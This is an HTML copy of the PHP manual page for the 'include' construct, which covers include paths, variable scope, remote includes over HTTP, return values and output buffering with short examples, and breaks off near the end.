<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

     
  
  <title>PHP: include - Manual</title>

      <link rel="stylesheet" type="text/css" href="/manual/en/fonts/Fira/fira.css" media="screen">
      <link rel="stylesheet" type="text/css" href="/manual/en/fonts/Font-Awesome/css/fontello.css" media="screen">
      <link rel="stylesheet" type="text/css" href="/manual/en/styles/theme-base.css" media="screen">
      <link rel="stylesheet" type="text/css" href="/manual/en/styles/theme-medium.css" media="screen">
  
 <link rel="icon" type="image/svg+xml" sizes="any" href="https://www.php.net/favicon.svg?v=2">
 <link rel="icon" type="image/png" sizes="196x196" href="https://www.php.net/favicon-196x196.png?v=2">
 <link rel="icon" type="image/png" sizes="32x32" href="https://www.php.net/favicon-32x32.png?v=2">
 <link rel="icon" type="image/png" sizes="16x16" href="https://www.php.net/favicon-16x16.png?v=2">
 <link rel="shortcut icon" href="https://www.php.net/favicon.ico?v=2">

 <link rel="search" type="application/opensearchdescription+xml" href="https://www.php.net/phpnetimprovedsearch.src" title="Add PHP.net search">
 <link rel="alternate" type="application/atom+xml" href="https://www.php.net/releases/feed.php" title="PHP Release feed">
 <link rel="alternate" type="application/atom+xml" href="https://www.php.net/feed.atom" title="PHP: Hypertext Preprocessor">

 <link rel="canonical" href="https://www.php.net/manual/en/function.include.php">
 <link rel="shorturl" href="https://www.php.net/include">
 <link rel="alternate" href="https://www.php.net/include" hreflang="x-default">

 <link rel="contents" href="https://www.php.net/manual/en/index.php">
 <link rel="index" href="https://www.php.net/manual/en/language.control-structures.php">
 <link rel="prev" href="https://www.php.net/manual/en/function.require.php">
 <link rel="next" href="https://www.php.net/manual/en/function.require-once.php">

 <link rel="alternate" href="https://www.php.net/manual/en/function.include.php" hreflang="en">
 <link rel="alternate" href="https://www.php.net/manual/de/function.include.php" hreflang="de">
 <link rel="alternate" href="https://www.php.net/manual/es/function.include.php" hreflang="es">
 <link rel="alternate" href="https://www.php.net/manual/fr/function.include.php" hreflang="fr">
 <link rel="alternate" href="https://www.php.net/manual/it/function.include.php" hreflang="it">
 <link rel="alternate" href="https://www.php.net/manual/ja/function.include.php" hreflang="ja">
 <link rel="alternate" href="https://www.php.net/manual/pt_BR/function.include.php" hreflang="pt_BR">
 <link rel="alternate" href="https://www.php.net/manual/ru/function.include.php" hreflang="ru">
 <link rel="alternate" href="https://www.php.net/manual/tr/function.include.php" hreflang="tr">
 <link rel="alternate" href="https://www.php.net/manual/uk/function.include.php" hreflang="uk">
 <link rel="alternate" href="https://www.php.net/manual/zh/function.include.php" hreflang="zh">

<link rel="stylesheet" type="text/css" href="/manual/en/fonts/Fira/fira.css" media="screen">
<link rel="stylesheet" type="text/css" href="/manual/en/fonts/Font-Awesome/css/fontello.css" media="screen">
<link rel="stylesheet" type="text/css" href="/manual/en/styles/theme-base.css" media="screen">
<link rel="stylesheet" type="text/css" href="/manual/en/styles/theme-medium.css" media="screen">


 

<meta name="Description" content="include" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@official_php" />
<meta name="twitter:title" content="PHP: include - Manual" />
<meta name="twitter:description" content="include" />
<meta name="twitter:creator" content="@official_php" />
<meta name="twitter:image:src" content="https://www.php.net/images/meta-image.png" />

<meta itemprop="name" content="PHP: include - Manual" />
<meta itemprop="description" content="include" />
<meta itemprop="image" content="https://www.php.net/images/meta-image.png" />

<meta property="og:image" content="https://www.php.net/images/meta-image.png" />
<meta property="og:description" content="include" />

<link href="https://fosstodon.org/@php" rel="me" />
<!-- Matomo -->
<script>
    var _paq = window._paq = window._paq || [];
    /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
    _paq.push(["setDoNotTrack", true]);
    _paq.push(["disableCookies"]);
    _paq.push(['trackPageView']);
    _paq.push(['enableLinkTracking']);
    (function() {
        var u="https://analytics.php.net/";
        _paq.push(['setTrackerUrl', u+'matomo.php']);
        _paq.push(['setSiteId', '1']);
        var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
        g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
    })();
</script>
<!-- End Matomo Code -->
</head>
<body class="docs ">

<nav class="navbar navbar-fixed-top">
  <div class="navbar__inner">
    <a href="/" aria-label="PHP Home" class="navbar__brand">
      <img
        src="/images/logos/php-logo-white.svg"
        aria-hidden="true"
        width="80"
        height="40"
      >
    </a>

    <div
      id="navbar__offcanvas"
      tabindex="-1"
      class="navbar__offcanvas"
      aria-label="Menu"
    >
      <button
        id="navbar__close-button"
        class="navbar__icon-item navbar_icon-item--visually-aligned navbar__close-button"
      >
        <svg xmlns="http://www.w3.org/2000/svg" width="24" viewBox="0 0 24 24" fill="currentColor"><path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z" /></svg>
      </button>

      <ul class="navbar__nav">
                            <li class="navbar__item">
              <a
                href="/downloads.php"
                                class="navbar__link  "
              >
                                  Downloads                              </a>
          </li>
                            <li class="navbar__item">
              <a
                href="/docs.php"
                aria-current="page"                class="navbar__link navbar__link--active "
              >
                                  Documentation                              </a>
          </li>
                            <li class="navbar__item">
              <a
                href="/get-involved.php"
                                class="navbar__link  "
              >
                                  Get Involved                              </a>
          </li>
                            <li class="navbar__item">
              <a
                href="/support.php"
                                class="navbar__link  "
              >
                                  Help                              </a>
          </li>
                            <li class="navbar__item">
              <a
                href="/releases/8.4/index.php"
                                class="navbar__link  navbar__release"
              >
                                  <img src="/images/php8/logo_php8_4.svg" alt="PHP 8.4">
                              </a>
          </li>
              </ul>
    </div>

    <div class="navbar__right">
      
      <!-- Desktop default search -->
      <form
        action="/manual-lookup.php"
        class="navbar__search-form"
      >
        <label for="navbar__search-input" aria-label="Search docs">
          <svg
  xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="none"
  stroke="currentColor"
  stroke-width="2"
  stroke-linecap="round"
  stroke-linejoin="round"
>
  <circle cx="11" cy="11" r="8"></circle>
  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>        </label>
        <input
          type="search"
          name="pattern"
          id="navbar__search-input"
          class="navbar__search-input"
          placeholder="Search docs"
          accesskey="s"
        >
        <input type="hidden" name="scope" value="quickref">
      </form>

      <!-- Desktop encanced search -->
      <button
        id="navbar__search-button"
        class="navbar__search-button"
        hidden
      >
        <svg
  xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="none"
  stroke="currentColor"
  stroke-width="2"
  stroke-linecap="round"
  stroke-linejoin="round"
>
  <circle cx="11" cy="11" r="8"></circle>
  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>        Search docs
      </button>

      <!-- Mobile default items -->
      <a
        id="navbar__search-link"
        href="/lookup-form.php"
        aria-label="Search docs"
        class="navbar__icon-item navbar__search-link"
      >
        <svg
  xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="none"
  stroke="currentColor"
  stroke-width="2"
  stroke-linecap="round"
  stroke-linejoin="round"
>
  <circle cx="11" cy="11" r="8"></circle>
  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>      </a>
      <a
        id="navbar__menu-link"
        href="/menu.php"
        aria-label="Menu"
        class="navbar__icon-item navbar_icon-item--visually-aligned navbar_menu-link"
      >
        <svg xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="currentColor"
>
  <path d="M3,6H21V8H3V6M3,11H21V13H3V11M3,16H21V18H3V16Z" />
</svg>      </a>

      <!-- Mobile enhanced items -->
      <button
        id="navbar__search-button-mobile"
        aria-label="Search docs"
        class="navbar__icon-item navbar__search-button-mobile"
        hidden
      >
        <svg
  xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="none"
  stroke="currentColor"
  stroke-width="2"
  stroke-linecap="round"
  stroke-linejoin="round"
>
  <circle cx="11" cy="11" r="8"></circle>
  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>      </button>
      <button
        id="navbar__menu-button"
        aria-label="Menu"
        class="navbar__icon-item navbar_icon-item--visually-aligned"
        hidden
      >
        <svg xmlns="http://www.w3.org/2000/svg"
  aria-hidden="true"
  width="24"
  viewBox="0 0 24 24"
  fill="currentColor"
>
  <path d="M3,6H21V8H3V6M3,11H21V13H3V11M3,16H21V18H3V16Z" />
</svg>      </button>
    </div>

    <div
      id="navbar__backdrop"
      class="navbar__backdrop"
    ></div>
  </div>

  <div id="flash-message"></div>
</nav>
<div class="headsup"><a href='/index.php#2025-09-25-3'>PHP 8.5.0 RC 1 available for testing</a></div>
<nav id="trick"><div><dl>
<dt><a href='/manual/en/getting-started.php'>Getting Started</a></dt>
	<dd><a href='/manual/en/introduction.php'>Introduction</a></dd>
	<dd><a href='/manual/en/tutorial.php'>A simple tutorial</a></dd>
<dt><a href='/manual/en/langref.php'>Language Reference</a></dt>
	<dd><a href='/manual/en/language.basic-syntax.php'>Basic syntax</a></dd>
	<dd><a href='/manual/en/language.types.php'>Types</a></dd>
	<dd><a href='/manual/en/language.variables.php'>Variables</a></dd>
	<dd><a href='/manual/en/language.constants.php'>Constants</a></dd>
	<dd><a href='/manual/en/language.expressions.php'>Expressions</a></dd>
	<dd><a href='/manual/en/language.operators.php'>Operators</a></dd>
	<dd><a href='/manual/en/language.control-structures.php'>Control Structures</a></dd>
	<dd><a href='/manual/en/language.functions.php'>Functions</a></dd>
	<dd><a href='/manual/en/language.oop5.php'>Classes and Objects</a></dd>
	<dd><a href='/manual/en/language.namespaces.php'>Namespaces</a></dd>
	<dd><a href='/manual/en/language.enumerations.php'>Enumerations</a></dd>
	<dd><a href='/manual/en/language.errors.php'>Errors</a></dd>
	<dd><a href='/manual/en/language.exceptions.php'>Exceptions</a></dd>
	<dd><a href='/manual/en/language.fibers.php'>Fibers</a></dd>
	<dd><a href='/manual/en/language.generators.php'>Generators</a></dd>
	<dd><a href='/manual/en/language.attributes.php'>Attributes</a></dd>
	<dd><a href='/manual/en/language.references.php'>References Explained</a></dd>
	<dd><a href='/manual/en/reserved.variables.php'>Predefined Variables</a></dd>
	<dd><a href='/manual/en/reserved.exceptions.php'>Predefined Exceptions</a></dd>
	<dd><a href='/manual/en/reserved.interfaces.php'>Predefined Interfaces and Classes</a></dd>
	<dd><a href='/manual/en/reserved.attributes.php'>Predefined Attributes</a></dd>
	<dd><a href='/manual/en/context.php'>Context options and parameters</a></dd>
	<dd><a href='/manual/en/wrappers.php'>Supported Protocols and Wrappers</a></dd>
</dl>
<dl>
<dt><a href='/manual/en/security.php'>Security</a></dt>
	<dd><a href='/manual/en/security.intro.php'>Introduction</a></dd>
	<dd><a href='/manual/en/security.general.php'>General considerations</a></dd>
	<dd><a href='/manual/en/security.cgi-bin.php'>Installed as CGI binary</a></dd>
	<dd><a href='/manual/en/security.apache.php'>Installed as an Apache module</a></dd>
	<dd><a href='/manual/en/security.sessions.php'>Session Security</a></dd>
	<dd><a href='/manual/en/security.filesystem.php'>Filesystem Security</a></dd>
	<dd><a href='/manual/en/security.database.php'>Database Security</a></dd>
	<dd><a href='/manual/en/security.errors.php'>Error Reporting</a></dd>
	<dd><a href='/manual/en/security.variables.php'>User Submitted Data</a></dd>
	<dd><a href='/manual/en/security.hiding.php'>Hiding PHP</a></dd>
	<dd><a href='/manual/en/security.current.php'>Keeping Current</a></dd>
<dt><a href='/manual/en/features.php'>Features</a></dt>
	<dd><a href='/manual/en/features.http-auth.php'>HTTP authentication with PHP</a></dd>
	<dd><a href='/manual/en/features.cookies.php'>Cookies</a></dd>
	<dd><a href='/manual/en/features.sessions.php'>Sessions</a></dd>
	<dd><a href='/manual/en/features.file-upload.php'>Handling file uploads</a></dd>
	<dd><a href='/manual/en/features.remote-files.php'>Using remote files</a></dd>
	<dd><a href='/manual/en/features.connection-handling.php'>Connection handling</a></dd>
	<dd><a href='/manual/en/features.persistent-connections.php'>Persistent Database Connections</a></dd>
	<dd><a href='/manual/en/features.commandline.php'>Command line usage</a></dd>
	<dd><a href='/manual/en/features.gc.php'>Garbage Collection</a></dd>
	<dd><a href='/manual/en/features.dtrace.php'>DTrace Dynamic Tracing</a></dd>
</dl>
<dl>
<dt><a href='/manual/en/funcref.php'>Function Reference</a></dt>
	<dd><a href='/manual/en/refs.basic.php.php'>Affecting PHP's Behaviour</a></dd>
	<dd><a href='/manual/en/refs.utilspec.audio.php'>Audio Formats Manipulation</a></dd>
	<dd><a href='/manual/en/refs.remote.auth.php'>Authentication Services</a></dd>
	<dd><a href='/manual/en/refs.utilspec.cmdline.php'>Command Line Specific Extensions</a></dd>
	<dd><a href='/manual/en/refs.compression.php'>Compression and Archive Extensions</a></dd>
	<dd><a href='/manual/en/refs.crypto.php'>Cryptography Extensions</a></dd>
	<dd><a href='/manual/en/refs.database.php'>Database Extensions</a></dd>
	<dd><a href='/manual/en/refs.calendar.php'>Date and Time Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.fileprocess.file.php'>File System Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.international.php'>Human Language and Character Encoding Support</a></dd>
	<dd><a href='/manual/en/refs.utilspec.image.php'>Image Processing and Generation</a></dd>
	<dd><a href='/manual/en/refs.remote.mail.php'>Mail Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.math.php'>Mathematical Extensions</a></dd>
	<dd><a href='/manual/en/refs.utilspec.nontext.php'>Non-Text MIME Output</a></dd>
	<dd><a href='/manual/en/refs.fileprocess.process.php'>Process Control Extensions</a></dd>
	<dd><a href='/manual/en/refs.basic.other.php'>Other Basic Extensions</a></dd>
	<dd><a href='/manual/en/refs.remote.other.php'>Other Services</a></dd>
	<dd><a href='/manual/en/refs.search.php'>Search Engine Extensions</a></dd>
	<dd><a href='/manual/en/refs.utilspec.server.php'>Server Specific Extensions</a></dd>
	<dd><a href='/manual/en/refs.basic.session.php'>Session Extensions</a></dd>
	<dd><a href='/manual/en/refs.basic.text.php'>Text Processing</a></dd>
	<dd><a href='/manual/en/refs.basic.vartype.php'>Variable and Type Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.webservice.php'>Web Services</a></dd>
	<dd><a href='/manual/en/refs.utilspec.windows.php'>Windows Only Extensions</a></dd>
	<dd><a href='/manual/en/refs.xml.php'>XML Manipulation</a></dd>
	<dd><a href='/manual/en/refs.ui.php'>GUI Extensions</a></dd>
</dl>
<dl>
<dt>Keyboard Shortcuts</dt><dt>?</dt>
<dd>This help</dd>
<dt>j</dt>
<dd>Next menu item</dd>
<dt>k</dt>
<dd>Previous menu item</dd>
<dt>g p</dt>
<dd>Previous man page</dd>
<dt>g n</dt>
<dd>Next man page</dd>
<dt>G</dt>
<dd>Scroll to bottom</dd>
<dt>g g</dt>
<dd>Scroll to top</dd>
<dt>g h</dt>
<dd>Goto homepage</dd>
<dt>g s</dt>
<dd>Goto search<br>(current page)</dd>
<dt>/</dt>
<dd>Focus search box</dd>
</dl></div></nav>
<div id="goto">
    <div class="search">
         <div class="text"></div>
         <div class="results"><ul></ul></div>
   </div>
</div>

  <div id="breadcrumbs" class="clearfix">
    <div id="breadcrumbs-inner">
          <div class="next">
        <a href="function.require-once.php">
          require_once &raquo;
        </a>
      </div>
              <div class="prev">
        <a href="function.require.php">
          &laquo; require        </a>
      </div>
          <ul>
            <li><a href='index.php'>PHP Manual</a></li>      <li><a href='langref.php'>Language Reference</a></li>      <li><a href='language.control-structures.php'>Control Structures</a></li>      </ul>
    </div>
  </div>




<div id="layout" class="clearfix">
  <section id="layout-content">
  <div class="page-tools">
    <div class="change-language">
      <form action="/manual/change.php" method="get" id="changelang" name="changelang">
        <fieldset>
          <label for="changelang-langs">Change language:</label>
          <select onchange="document.changelang.submit()" name="page" id="changelang-langs">
            <option value='en/function.include.php' selected="selected">English</option>
            <option value='de/function.include.php'>German</option>
            <option value='es/function.include.php'>Spanish</option>
            <option value='fr/function.include.php'>French</option>
            <option value='it/function.include.php'>Italian</option>
            <option value='ja/function.include.php'>Japanese</option>
            <option value='pt_BR/function.include.php'>Brazilian Portuguese</option>
            <option value='ru/function.include.php'>Russian</option>
            <option value='tr/function.include.php'>Turkish</option>
            <option value='uk/function.include.php'>Ukrainian</option>
            <option value='zh/function.include.php'>Chinese (Simplified)</option>
            <option value='help-translate.php'>Other</option>
          </select>
        </fieldset>
      </form>
    </div>
  </div><div id="function.include" class="sect1">
 <h2 class="title">include</h2>
 <p class="verinfo">(PHP 4, PHP 5, PHP 7, PHP 8)</p>
 <p class="simpara">
  The <code class="literal">include</code> expression includes and evaluates
  the specified file.
 </p>
 <p class="simpara">
  The documentation below also applies to <span class="function"><a href="function.require.php" class="function">require</a></span>.
 </p>
 <p class="simpara">
  Files are included based on the file path given or, if none is given, the
  <a href="ini.core.php#ini.include-path" class="link">include_path</a> specified. If the file
  isn&#039;t found in the <a href="ini.core.php#ini.include-path" class="link">include_path</a>,
  <code class="literal">include</code> will finally check in the calling script&#039;s own
  directory and the current working directory before failing. The
  <code class="literal">include</code> construct will emit an
  <strong><code><a href="errorfunc.constants.php#constant.e-warning">E_WARNING</a></code></strong> if
  it cannot find a file; this is different behavior from
  <span class="function"><a href="function.require.php" class="function">require</a></span>, which will emit an
  <strong><code><a href="errorfunc.constants.php#constant.e-error">E_ERROR</a></code></strong>.
 </p>
 <p class="simpara">
  Note that both <code class="literal">include</code> and <code class="literal">require</code>
  raise additional <strong><code><a href="errorfunc.constants.php#constant.e-warning">E_WARNING</a></code></strong>s, if the file cannot be
  accessed, before raising the final <strong><code><a href="errorfunc.constants.php#constant.e-warning">E_WARNING</a></code></strong> or
  <strong><code><a href="errorfunc.constants.php#constant.e-error">E_ERROR</a></code></strong>, respectively.
 </p>
 <p class="simpara">
  If a path is defined — whether absolute (starting with a drive letter
  or <code class="literal">\</code> on Windows, or <code class="literal">/</code> on Unix/Linux
  systems) or relative to the current directory (starting with
  <code class="literal">.</code> or <code class="literal">..</code>) — the
  <a href="ini.core.php#ini.include-path" class="link">include_path</a> will be ignored
  altogether.  For example, if a filename begins with <code class="literal">../</code>,
  the parser will look in the parent directory to find the requested file.
 </p>
 <p class="simpara">
  For more information on how PHP handles including files and the include path,
  see the documentation for <a href="ini.core.php#ini.include-path" class="link">include_path</a>.
 </p>
 <p class="simpara">
  When a file is included, the code it contains inherits the
  <a href="language.variables.scope.php" class="link">variable scope</a> of the
  line on which the include occurs.  Any variables available at that line
  in the calling file will be available within the called file, from that
  point forward.
  However, all functions and classes defined in the included file have the
  global scope.
 </p>
 <p class="para">
  <div class="example" id="example-200">
   <p><strong>Example #1 Basic <code class="literal">include</code> example</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color </span><span style="color: #007700">= </span><span style="color: #DD0000">'green'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$fruit </span><span style="color: #007700">= </span><span style="color: #DD0000">'apple'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />test.php<br /><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">; </span><span style="color: #FF8000">// A<br /><br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">; </span><span style="color: #FF8000">// A green apple<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  If the include occurs inside a function within the calling file,
  then all of the code contained in the called file will behave as
  though it had been defined inside that function.  So, it will follow
  the variable scope of that function.
  An exception to this rule are <a href="language.constants.magic.php" class="link">magic constants</a> which are
  evaluated by the parser before the include occurs.
 </p>
 <p class="para">
  <div class="example" id="example-201">
   <p><strong>Example #2 Including within functions</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">function </span><span style="color: #0000BB">foo</span><span style="color: #007700">()<br />{<br />    global </span><span style="color: #0000BB">$color</span><span style="color: #007700">;<br /><br />    include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />    echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">/* vars.php is in the scope of foo() so     *<br />* $fruit is NOT available outside of this  *<br />* scope.  $color is because we declared it *<br />* as global.                               */<br /><br /></span><span style="color: #0000BB">foo</span><span style="color: #007700">();                    </span><span style="color: #FF8000">// A green apple<br /></span><span style="color: #007700">echo </span><span style="color: #DD0000">"A </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;   </span><span style="color: #FF8000">// A green<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  When a file is included, parsing drops out of PHP mode and
  into HTML mode at the beginning of the target file, and resumes
  again at the end.  For this reason, any code inside the target
  file which should be executed as PHP code must be enclosed within
  <a href="language.basic-syntax.phpmode.php" class="link">valid PHP start
  and end tags</a>.
 </p>
 <p class="simpara">
  If &quot;<a href="filesystem.configuration.php#ini.allow-url-include" class="link">URL include wrappers</a>&quot;
  are enabled in PHP,
  you can specify the file to be included using a URL (via HTTP or
  other supported wrapper - see <a href="wrappers.php" class="xref">Supported Protocols and Wrappers</a> for a list
  of protocols) instead of a local pathname.  If the target server interprets
  the target file as PHP code, variables may be passed to the included
  file using a URL request string as used with HTTP GET.  This is
  not strictly speaking the same thing as including the file and having
  it inherit the parent file&#039;s variable scope; the script is actually
  being run on the remote server and the result is then being
  included into the local script.
 </p>
 <p class="para">
  <div class="example" id="example-202">
   <p><strong>Example #3 <code class="literal">include</code> through HTTP</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #FF8000">/* This example assumes that www.example.com is configured to parse .php<br />* files and not .txt files. Also, 'Works' here means that the variables<br />* $foo and $bar are available within the included file. */<br /><br />// Won't work; file.txt wasn't handled by www.example.com as PHP<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'http://www.example.com/file.txt?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">// Won't work; looks for a file named 'file.php?foo=1&amp;bar=2' on the<br />// local filesystem.<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">// Works.<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'http://www.example.com/file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
   </div>

  </div>
 </p>
 <div class="warning"><strong class="warning">Warning</strong>
  <h1 class="title">Security warning</h1>
  <p class="para">
   Remote file may be processed at the remote server (depending on the file
   extension and the fact if the remote server runs PHP or not) but it still
   has to produce a valid PHP script because it will be processed at the
   local server. If the file from the remote server should be processed
   there and outputted only, <span class="function"><a href="function.readfile.php" class="function">readfile()</a></span> is much better
   function to use. Otherwise, special care should be taken to secure the
   remote script to produce a valid and desired code.
  </p>
 </div>
 <p class="para">
  See also <a href="features.remote-files.php" class="link">Remote files</a>,
  <span class="function"><a href="function.fopen.php" class="function">fopen()</a></span> and <span class="function"><a href="function.file.php" class="function">file()</a></span> for related
  information.
 </p>
 <p class="simpara">
  Handling Returns: <code class="literal">include</code> returns
  <code class="literal">FALSE</code> on failure and raises a warning. Successful
  includes, unless overridden by the included file, return
  <code class="literal">1</code>. It is possible to execute a <span class="function"><a href="function.return.php" class="function">return</a></span>
  statement inside an included file in order to terminate processing in
  that file and return to the script which called it.  Also, it&#039;s possible
  to return values from included files. You can take the value of the
  include call as you would for a normal function.  This is not, however,
  possible when including remote files unless the output of the remote
  file has <a href="language.basic-syntax.phpmode.php" class="link">valid PHP start
  and end tags</a> (as with any local file).  You can declare the
  needed variables within those tags and they will be introduced at
  whichever point the file was included.
 </p>
 <p class="para">
  Because <code class="literal">include</code> is a special language construct,
  parentheses are not needed around its argument. Take care when comparing
  return value.
  <div class="example" id="example-203">
   <p><strong>Example #4 Comparing return value of include</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">// won't work, evaluated as include(('vars.php') == TRUE), i.e. include('1')<br /></span><span style="color: #007700">if (include(</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">) == </span><span style="color: #0000BB">TRUE</span><span style="color: #007700">) {<br />    echo </span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">// works<br /></span><span style="color: #007700">if ((include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">) == </span><span style="color: #0000BB">TRUE</span><span style="color: #007700">) {<br />    echo </span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
   </div>

  </div>
 </p>
 <p class="para">
  <div class="example" id="example-204">
   <p><strong>Example #5 <code class="literal">include</code> and the <span class="function"><a href="function.return.php" class="function">return</a></span> statement</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var </span><span style="color: #007700">= </span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br />return </span><span style="color: #0000BB">$var</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />noreturn.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var </span><span style="color: #007700">= </span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />testreturns.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$foo </span><span style="color: #007700">= include </span><span style="color: #DD0000">'return.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #0000BB">$foo</span><span style="color: #007700">; </span><span style="color: #FF8000">// prints 'PHP'<br /><br /></span><span style="color: #0000BB">$bar </span><span style="color: #007700">= include </span><span style="color: #DD0000">'noreturn.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #0000BB">$bar</span><span style="color: #007700">; </span><span style="color: #FF8000">// prints 1<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  <code class="literal">$bar</code> is the value <code class="literal">1</code> because the include
  was successful.  Notice the difference between the above examples.  The first uses
  <span class="function"><a href="function.return.php" class="function">return</a></span> within the included file while the other does not.
  If the file can&#039;t be included, <strong><code><a href="reserved.constants.php#constant.false">false</a></code></strong> is returned and
  <strong><code><a href="errorfunc.constants.php#constant.e-warning">E_WARNING</a></code></strong> is issued.
 </p>
 <p class="para">
  If there are functions defined in the included file, they can be used in the
  main file independent if they are before <span class="function"><a href="function.return.php" class="function">return</a></span> or after.
  If the file is included twice, PHP will raise a fatal error because the
  functions were already declared.
  It is recommended to use <span class="function"><a href="function.include-once.php" class="function">include_once</a></span> instead of
  checking if the file was already included and conditionally return inside
  the included file.
 </p>
 <p class="simpara">
  Another way to &quot;include&quot; a PHP file into a variable is to capture the
  output by using the <a href="ref.outcontrol.php" class="link">Output Control
  Functions</a> with <code class="literal">include</code>. For example:
 </p>
 <p class="para">
  <div class="example" id="example-205">
   <p><strong>Example #6 Using output buffering to include a PHP file into a string</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br />$string </span><span style="color: #007700">= </span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'somefile.php'</span><span style="color: #007700">);<br /><br />function </span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">) {<br />    if (</span><span style="color: #0000BB">is_file</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">)) {<br />        </span><span style="color: #0000BB">ob_start</span><span style="color: #007700">();<br />        include </span><span style="color: #0000BB">$filename</span><span style="color: #007700">;<br />        return </span><span style="color: #0000BB">ob_get_clean</span><span style="color: #007700">();<br />    }<br />    return </span><span style="color: #0000BB">false</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
   </div>

  </div>
 </p>
 <p class="para">
  In order to automatically include files within scripts, see also the
  <a href="ini.core.php#ini.auto-prepend-file" class="link">auto_prepend_file</a> and
  <a href="ini.core.php#ini.auto-append-file" class="link">auto_append_file</a>
  configuration options in <var class="filename">php.ini</var>.
 </p>

 <blockquote class="note"><p><strong class="note">Note</strong>: <span class="simpara">Because this is a
language construct and not a function, it cannot be called using
<a href="functions.variable-functions.php" class="link">variable functions</a>,
or <a href="functions.arguments.php#functions.named-arguments" class="link">named arguments</a>.</span>
